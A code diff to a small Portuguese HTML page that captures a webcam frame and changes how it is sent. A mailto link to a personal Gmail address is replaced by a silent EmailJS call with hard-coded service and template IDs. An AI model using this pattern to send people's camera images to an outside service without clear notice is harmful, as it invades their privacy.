@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Captura de Webcam</title>
+    <title>Captura e Envio de Webcam</title>
 </head>
 <body>
     <h1>Captura de Webcam</h1>
@@ -31,10 +31,17 @@
             canvas.getContext('2d').drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
             photo.src = canvas.toDataURL('image/jpeg');
 
-            // Converter a imagem para base64 e abrir o cliente de e-mail
-            const imageBase64 = photo.src.split(',')[1];
-            const mailtoLink = 'mailto:kinho.mp@gmail.com?subject=Assunto do E-mail&body=Corpo do E-mail&attach=data:image/jpeg;base64,' + imageBase64;
-            window.location.href = mailtoLink;
+            // Enviar a imagem por e-mail usando o serviço Email.js
+            const templateId = 'template_dejnx6u'; // Substitua com o ID do seu modelo de e-mail no Email.js
+            const serviceId = 'service_ok0e8th'; // Substitua com o ID do seu serviço no Email.js
+
+            emailjs.send(serviceId, templateId, {
+                image: photo.src,
+            }).then(function(response) {
+                console.log('E-mail enviado com sucesso:', response);
+            }, function(error) {
+                console.error('Erro ao enviar o e-mail:', error);
+            });
         });
     </script>
 </body>
